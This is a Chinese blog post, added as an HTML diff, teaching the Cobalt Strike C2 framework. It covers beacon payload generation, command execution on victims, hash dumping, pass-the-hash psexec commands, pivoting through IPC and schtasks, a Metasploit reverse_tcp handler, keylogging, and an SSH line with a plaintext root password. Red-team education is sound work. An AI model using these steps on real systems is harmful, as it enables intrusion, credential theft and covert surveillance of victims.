@@ -1,0 +1,1333 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="CobalStrike扫盲, 内网渗透 Python Windows API 钓鱼社工">
+    <meta name="baidu-site-verification" content="fmlEuI34ir">
+    <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
+    <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
+    <meta name="description" content="0x09-CobalStrike安装、运行、介绍
+上线+命令执行
+取密码
+socks4 代理
+扩展脚本-cna
+hash传递（端口扫描）
+中转上线（不出网的情况下上线）
+和msf联动
+屏幕截图，键盘记录
+ssh上线0x01 安装、运行、介绍">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>CobalStrike扫盲 | ske的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+    
+
+    <script>
+        (function(){
+        var src = "https://jspassport.ssl.qhimg.com/11.0.1.js?d182b3f28525f2db83acfaaf6e696dba";
+        document.write('<script src="' + src + '" id="sozz"><\/script>');
+        })();
+    </script>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body>
+
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">ske的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <i class="fa fa-comments"></i>
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ske的博客</div>
+        <div class="logo-desc">
+            
+            内网渗透 | Python | Windows API | 钓鱼社工
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-comments"></i>
+                
+                留言板
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/SkewwG/hexo-matery-modified" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/SkewwG/hexo-matery-modified" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/CobalStrikeLiteracy/0.6533318592180974.png')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        CobalStrike扫盲
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                        <a href="/tags/CobalStrike扫盲/" target="_blank">
+                            <span class="chip bg-color">CobalStrike扫盲</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                        <a href="/categories/CobalStrike/" class="post-category" target="_blank">
+                            CobalStrike
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-11-27
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                    ske
+                    
+                </div>
+
+                
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    6 分
+                </div>
+                
+                
+
+                
+                <div id="busuanzi_container_page_pv" class="info-break-policy">
+                    <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                    <span id="busuanzi_value_page_pv"></span>
+                </div>
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="0x09-CobalStrike"><a href="#0x09-CobalStrike" class="headerlink" title="0x09-CobalStrike"></a>0x09-CobalStrike</h1><pre><code>安装、运行、介绍
+上线+命令执行
+取密码
+socks4 代理
+扩展脚本-cna
+hash传递（端口扫描）
+中转上线（不出网的情况下上线）
+和msf联动
+屏幕截图，键盘记录
+ssh上线</code></pre><h2 id="0x01-安装、运行、介绍"><a href="#0x01-安装、运行、介绍" class="headerlink" title="0x01 安装、运行、介绍"></a>0x01 安装、运行、介绍</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>apt install default-jdk
+将cs文件夹复制到Linux下
+chmod 777 teamserver</code></pre><p><img src="/img/CobalStrikeLiteracy/0.4295879606896589.png" alt="img"></p>
+<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><pre><code>./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]
+&lt;host&gt; 必需参数 团队服务器IP
+&lt;password&gt; 必需参数 连接服务器的密码
+[/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性
+[YYYY-MM-DD] 可选参数 所有payload的终止时间
+# 启动Team Server
+./teamserver 192.168.183.147 123456 # 设置强密码，否则容易被爆破，参考附录
+默认连接端口为50050，如果你想修改端口只需修改teamserver文件</code></pre><p><img src="/img/CobalStrikeLiteracy/0.030918049820894786.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/0.2975981257563896.png" alt="img"></p>
+<h3 id="参数详情"><a href="#参数详情" class="headerlink" title="参数详情"></a>参数详情</h3><p>Cobalt Strike</p>
+<pre><code>New Connection # 新建连接，支持连接多个服务器端
+Preferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录
+Visualization # 主要展示输出结果的视图
+VPN Interfaces # 设置VPN接口
+Listenrs # 创建监听器
+Script Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等
+Close # 退出连接</code></pre><p><img src="/img/CobalStrikeLiteracy/0.13801954727640234.png" alt="img"></p>
+<p>View</p>
+<pre><code>Applications # 显示受害主机的应用信息
+Credentials # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz
+Downloads # 查看已下载文件
+Event Log # 主机上线记录以及团队协作聊天记录
+Keystrokes # 查看键盘记录结果
+Proxy Pivots # 查看代理模块
+Screenshots # 查看所有屏幕截图
+Script Console # 加载第三方脚本以增强功能 
+Targets # 显示所有受害主机
+Web Log # 所有Web服务的日志</code></pre><p><img src="/img/CobalStrikeLiteracy/0.16414763602254645.png" alt="img"></p>
+<p>Attacks</p>
+<pre><code>Packages
+HTML Application # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件
+MS Office Macro # 生成office宏病毒文件
+Payload Generator # 生成各种语言版本的payload
+USB/CD AutoPlay # 生成利用自动播放运行的木马文件
+Windows Dropper # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)
+Windows Executable # 生成可执行exe木马
+Windows Executable(Stageless) # 生成无状态的可执行exe木马</code></pre><p><img src="/img/CobalStrikeLiteracy/0.39729118995260604.png" alt="img"></p>
+<p>Web Drive-by</p>
+<pre><code>Manage # 对开启的web服务进行管理
+Clone Site # 克隆网站，可以记录受害者提交的数据
+Host File # 提供文件下载，可以选择Mime类型
+Scripted Web Delivery # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery 
+Signed Applet Attack # 使用java自签名的程序进行钓鱼攻击(该方法已过时)
+Smart Applet Attack # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)
+System Profiler # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等
+Spear Phish # 鱼叉钓鱼邮件</code></pre><p><img src="/img/CobalStrikeLiteracy/0.07192938054993915.png" alt="img"></p>
+<p>Reporting</p>
+<pre><code>Activity Report # 活动报告
+Hosts Report # 主机报告
+Indicators of Compromise # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes
+Sessions Report # 会话报告
+Social Engineering Report # 社会工程报告：包括鱼叉钓鱼邮件及点击记录
+Tactics, Techniques, and Procedures # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略
+Reset Data # 重置数据
+Export Data # 导出数据，导出.tsv文件格式</code></pre><p><img src="/img/CobalStrikeLiteracy/0.4228559550173042.png" alt="img"></p>
+<p>Help</p>
+<pre><code>Homepage # 官方主页
+Support # 技术支持
+Arsenal # 开发者
+System information # 版本信息
+About # 关于</code></pre><p><img src="/img/CobalStrikeLiteracy/0.40007668547560965.png" alt="img"></p>
+<p>工具栏</p>
+<pre><code>1.新建连接
+2.断开当前连接
+3.监听器
+4.改变视图为Pivot Graph(视图列表)
+5.改变视图为Session Table(会话列表)
+6.改变视图为Target Table(目标列表)
+7.显示所有以获取的受害主机的凭证
+8.查看已下载文件
+9.查看键盘记录结果
+10.查看屏幕截图
+11.生成无状态的可执行exe木马
+12.使用java自签名的程序进行钓鱼攻击
+13.生成office宏病毒文件
+14.为payload提供web服务以便下载和执行
+15.提供文件下载，可以选择Mime类型
+16.管理Cobalt Strike上运行的web服务
+17.帮助
+18.关于</code></pre><p><img src="/img/CobalStrikeLiteracy/0.6533318592180974.png" alt="img"></p>
+<h2 id="0x02-上线"><a href="#0x02-上线" class="headerlink" title="0x02 上线"></a>0x02 上线</h2><h3 id="脚本上线"><a href="#脚本上线" class="headerlink" title="脚本上线"></a>脚本上线</h3><p><img src="/img/CobalStrikeLiteracy/3d1d80e5-2da3-42ae-868f-9f0c68725a9d.png" alt="img"></p>
+<p>创建监听器</p>
+<p><img src="/img/CobalStrikeLiteracy/e481d734-6f7a-4c56-9a4a-3608208e9376.png" alt="img"></p>
+<p>选择上线脚本</p>
+<p><img src="/img/CobalStrikeLiteracy/89e1e655-b2e6-468b-a6e3-f59dacc4e055.png" alt="img"></p>
+<p>生成上线脚本</p>
+<p><img src="/img/CobalStrikeLiteracy/8e8bc7c7-5dea-4f71-8be5-59e1351520e4.png" alt="img"></p>
+<p>目标机器执行</p>
+<p><img src="/img/CobalStrikeLiteracy/5c1a89e8-ce77-454c-97e0-6521b7979e72.png" alt="img"></p>
+<p>成功上线</p>
+<p><img src="/img/CobalStrikeLiteracy/2c4d3ecc-9418-4003-8514-7b1dfbd4a193.png" alt="img"></p>
+<p>dll上线-针对windows2003系统</p>
+<p><img src="/img/CobalStrikeLiteracy/95d70b3a-5d25-4c6e-8fb4-d2d8a43a529b.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/4868ce1b-0b75-4409-a2c2-1d36f17105e0.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/ed747050-b9be-4bb8-9284-d92b950f48dd.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/66116645-f061-4062-9e13-ad20a2182c7e.png" alt="img"></p>
+<p>改变心跳时间</p>
+<p><img src="/img/CobalStrikeLiteracy/a48189f6-04ea-4d5e-b86e-8b909ea04a9a.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/f1c8e5dc-6d7b-4d59-8dbc-e94185775f87.png" alt="img"></p>
+<p>执行命令</p>
+<p>shell command</p>
+<p><img src="/img/CobalStrikeLiteracy/58148862-d11c-405e-a99d-abddec9cce3e.png" alt="img"></p>
+<p>派生</p>
+<p><img src="/img/CobalStrikeLiteracy/fb60c9c4-d253-453e-8360-cd544bad1f63.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/c10b4b34-c719-4e38-9340-ede16c643f3b.png" alt="img"></p>
+<p>成功又出现一个</p>
+<p><img src="/img/CobalStrikeLiteracy/64282938-2f15-44e4-abd2-84a0d7328c28.png" alt="img"></p>
+<p>查看文件</p>
+<p><img src="/img/CobalStrikeLiteracy/adf1e010-7cd6-4aa8-a4d8-28339918171d.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/9a33a714-0b38-454a-8fe5-3c150960656f.png" alt="img"></p>
+<p>上传文件</p>
+<p><img src="/img/CobalStrikeLiteracy/e50edd1f-b21d-4b82-9d68-5ff4b48498dd.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/fc09befa-bcea-40b6-978f-49a93673d39e.png" alt="img"></p>
+<p>下载文件</p>
+<p><img src="/img/CobalStrikeLiteracy/412755e7-5519-4ed0-9088-92075b5b63c8.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/6feea086-714c-41d8-bacd-9b3f0e538292.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/b1c66fbf-4d06-4868-9c97-e10e3631f234.png" alt="img"></p>
+<h2 id="0x03-取密码"><a href="#0x03-取密码" class="headerlink" title="0x03 取密码"></a>0x03 取密码</h2><p>内存hash</p>
+<p><img src="/img/CobalStrikeLiteracy/f5a584e4-1eb3-4d2f-ba96-e25e2ff23f1d.png" alt="img"></p>
+<p>注册表的hash</p>
+<p><img src="/img/CobalStrikeLiteracy/be307192-274e-4e46-ac0f-07922005f148.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/6433ab39-1806-4bfb-87b3-c5b10709e7a8.png" alt="img"></p>
+<h2 id="0x04-socks4-a-代理"><a href="#0x04-socks4-a-代理" class="headerlink" title="0x04 socks4 a 代理"></a>0x04 socks4 a 代理</h2><p><img src="/img/CobalStrikeLiteracy/8ccb0736-f712-4914-af01-67894b82c2a8.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/463ada81-1267-40ab-8ceb-616331f07474.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/60c0f8e1-6fcc-4c54-a108-73f60fd08073.png" alt="img"></p>
+<p>成功代理</p>
+<p><img src="/img/CobalStrikeLiteracy/35fa1d93-9476-453e-ae77-46461c1589b2.png" alt="img"></p>
+<h2 id="0x05-扩展脚本-cna"><a href="#0x05-扩展脚本-cna" class="headerlink" title="0x05 扩展脚本-cna"></a>0x05 扩展脚本-cna</h2><p>Ladon</p>
+<pre><code>https://github.com/k8gege/Ladon</code></pre><p><img src="/img/CobalStrikeLiteracy/c6a8adbd-73c3-41cf-8fc1-c91557d2ab5f.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/b5ed6eff-49af-4e24-a90b-b5aaf607fe4b.png" alt="img"></p>
+<p>成功加载</p>
+<p><img src="/img/CobalStrikeLiteracy/ab281c7f-3bf1-4f10-91ac-2fc87336a32b.png" alt="img"></p>
+<p>运行Ladon</p>
+<p><img src="/img/CobalStrikeLiteracy/a4888c5b-eda9-43d0-885d-7bf0c9af13ed.png" alt="img"></p>
+<pre><code>Ladon 192.168.11.0/24 OnlinePC      存活扫描
+Ladon 192.168.11.0/24 PortScan      端口扫描
+Ladon 192.168.11.0/24 WebScan       web扫描
+Ladon 192.168.11.0/24 MS17010       17010扫描</code></pre><p>还有很多功能，自行研究</p>
+<h2 id="0x06-hash传递"><a href="#0x06-hash传递" class="headerlink" title="0x06 hash传递"></a>0x06 hash传递</h2><p>psexec pth传递单个上线</p>
+<pre><code>pth 域名\用户名 密码ntlm
+psexec ip\域机器 ADMIN$ 监听的名字
+pth domain\administrator 88966b179aaaaaa67870a34eaf
+psexec DC02 ADMIN$ a                            a是监听的名字
+pth .\administrator 5a09d1400b366aaaaa2344a3d07375
+psexec 10.192.204.5 ADMIN$ 1111                    1111是监听</code></pre><p>成功上线（前提是能够出网）</p>
+<p><img src="/img/CobalStrikeLiteracy/4101640.png" alt="img"></p>
+<p>使用相同的账号密码批量上线</p>
+<p>\1. 端口扫描判断存活</p>
+<p>\2. 选中存活的主机，批量登录-使用psexec_psh</p>
+<p><img src="/img/CobalStrikeLiteracy/0.39369171800484487.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/0.5840731309741612.png" alt="img"></p>
+<p>扫描结果</p>
+<p><img src="/img/CobalStrikeLiteracy/4036484.png" alt="img"></p>
+<p>选中存活机器，右键login-&gt;psexec(psh)</p>
+<p><img src="/img/CobalStrikeLiteracy/0.3387576826443788.png" alt="img"></p>
+<p>如果是域用户，则domain框填写域名，本地用户，则domain框随便填写</p>
+<p>session选择当前控制的机器</p>
+<p><img src="/img/CobalStrikeLiteracy/4167546.png" alt="img"></p>
+<p>launch，就会对存活主机hash传递并上线</p>
+<p><img src="/img/CobalStrikeLiteracy/0.15842965852393573.png" alt="img"></p>
+<p>成功和失败的结果</p>
+<p><img src="/img/CobalStrikeLiteracy/0.2904655007953677.png" alt="img"></p>
+<h2 id="0x07-中转上线"><a href="#0x07-中转上线" class="headerlink" title="0x07 中转上线"></a>0x07 中转上线</h2><p>内网不出网的机器中转上线</p>
+<p>当前机器开启一个监听</p>
+<p><img src="/img/CobalStrikeLiteracy/0.6096430050494017.png" alt="img"></p>
+<p>Name随便填写一个，其他的默认即可</p>
+<p><img src="/img/CobalStrikeLiteracy/0.8974812485398633.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/0.32524435229508597.png" alt="img"></p>
+<p>Stage选择zhongzhuan，output选择exe，然后会生成一个beacon.exe</p>
+<p><img src="/img/CobalStrikeLiteracy/0.5106082009923364.png" alt="img"></p>
+<p>通过net use和不出网的内网机器建立IPC连接，然后将beacon.exe 复制到目标机器里，再使用计划任务schtasks执行beacon.exe即可上线</p>
+<p><img src="/img/CobalStrikeLiteracy/0.9823994953797551.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/0.7953847017401188.png" alt="img"></p>
+<p>成功上线</p>
+<p><img src="/img/CobalStrikeLiteracy/0.21118317239101586.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/0.9080092441580215.png" alt="img"></p>
+<h2 id="0x08-联动MSF"><a href="#0x08-联动MSF" class="headerlink" title="0x08 联动MSF"></a>0x08 联动MSF</h2><p>msf监听</p>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 
+set lport 
+run</code></pre><p><img src="/img/CobalStrikeLiteracy/0.9925311858482716.png" alt="img"></p>
+<p>创建一个监听器，ip和port设置为msf的ip和port</p>
+<p><img src="/img/CobalStrikeLiteracy/0.9281324896355443.png" alt="img"></p>
+<p>目标机器右键spawn</p>
+<p><img src="/img/CobalStrikeLiteracy/0.1054484216844525.png" alt="img"></p>
+<p>选择msf监听器</p>
+<p><img src="/img/CobalStrikeLiteracy/0.44625564552911096.png" alt="img"></p>
+<p>msf成功上线</p>
+<p><img src="/img/CobalStrikeLiteracy/0.7665290584580648.png" alt="img"></p>
+<h2 id="0x09-屏幕截图和键盘记录"><a href="#0x09-屏幕截图和键盘记录" class="headerlink" title="0x09 屏幕截图和键盘记录"></a>0x09 屏幕截图和键盘记录</h2><p>屏幕截图</p>
+<p><img src="/img/CobalStrikeLiteracy/2d6ff6d6-a5b8-4169-84cc-a849b171d98a.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/d0cf3ab6-c82f-4628-a70a-9d2c0a2f033c.png" alt="img"></p>
+<p><img src="/img/CobalStrikeLiteracy/6f68852c-9ca9-42cd-8bd5-e6d1bc43ddfe.png" alt="img"></p>
+<p>键盘记录</p>
+<p>列出进程</p>
+<p><img src="/img/CobalStrikeLiteracy/f82b0bfe-c88e-4897-83a4-93cc3997b560.png" alt="img"></p>
+<p>选择全部</p>
+<p><img src="/img/CobalStrikeLiteracy/4959af83-e744-4e3a-be57-ea62d284a959.png" alt="img"></p>
+<p>等加载完</p>
+<p><img src="/img/CobalStrikeLiteracy/0290b9d8-5ccb-44b0-9376-86ce1c266634.png" alt="img"></p>
+<p>目标输入</p>
+<p><img src="/img/CobalStrikeLiteracy/8a1a893d-5d44-4171-b608-ffba8930545c.png" alt="img"></p>
+<p>成功记录</p>
+<p><img src="/img/CobalStrikeLiteracy/f64438ab-5b51-4c22-98f4-9c2ae01322b3.png" alt="img"></p>
+<h2 id="0x010-Linux上线"><a href="#0x010-Linux上线" class="headerlink" title="0x010 Linux上线"></a>0x010 Linux上线</h2><pre><code>ssh 172.16.200.30:22 root Huawei12#$</code></pre><p><img src="/img/CobalStrikeLiteracy/84d1bbd8-e8ff-4b27-8789-f72df2479c74.png" alt="img"></p>
+
+            </div>
+            <hr />
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《CobalStrike扫盲》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/11/27/cobalstrike-sao-mang/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                ske
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'SkewwG.github.io',
+        owner: 'SkewwG',
+        admin: "SkewwG",
